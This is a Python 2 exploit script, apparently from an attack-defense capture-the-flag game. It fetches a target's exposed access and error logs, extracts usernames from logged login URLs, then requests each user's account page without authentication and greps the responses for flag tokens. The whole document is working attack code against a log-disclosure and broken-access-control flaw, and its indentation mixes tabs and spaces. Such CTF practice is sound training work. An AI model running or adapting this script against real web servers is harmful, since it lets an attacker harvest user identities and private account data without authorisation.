#!/usr/bin/env python2
"""This is an exploit template which includes some functions that should
make the process of writing exploits quicker and easier."""
import sys
import re
import socket

# Recommended for HTTP related tasks
# Docs: http://docs.python-requests.org/en/latest/
import requests

REGEX = re.compile(r"cgi.*?login=(.*?)&")
FLAG_GREP = re.compile(r"(\w{31}=)")

if sys.version_info > (3,0,0):
    xrange = range


def get_by_http(url):
    response = requests.get(url)
    return response.text


def exploit(targetIP):
    # Do all the exploitation stuff here, return a list of flags
    headers = {'Host':'bank.{}'.format(targetIP)}
    accesslog = requests.get('http://{}/access.log'.format(targetIP), headers=headers)
    errorlog = requests.get('http://{}/error.log'.format(targetIP), headers=headers)

    users = REGEX.findall(''.join(accesslog.text.split('\n')[-200:]))
    users += REGEX.findall(''.join(errorlog.text.split('\n')[-200:]))

    allflags = []

    for user in users:
        if len(user) is 1:
	    continue

    	profile = requests.get('http://{}/account.cgi?login={}'.format(targetIP, user), headers=headers)

	flags = FLAG_GREP.findall(profile.text)

        for i in flags:
	    print(i)
	    if not i:
                continue

	    allflags.append(i)

    return allflags

def main(targetIP):
    try:
        flags = exploit(targetIP)

        # The exploit only needs to print the flags, one per line.
        for flag in flags:
            print(flag)

        return 0
    except Exception as e:
        print(e)
        return 1


if __name__ == '__main__':
    # Read ip and port from commandline
    targetIP = sys.argv[1]
    sys.exit(main(targetIP))
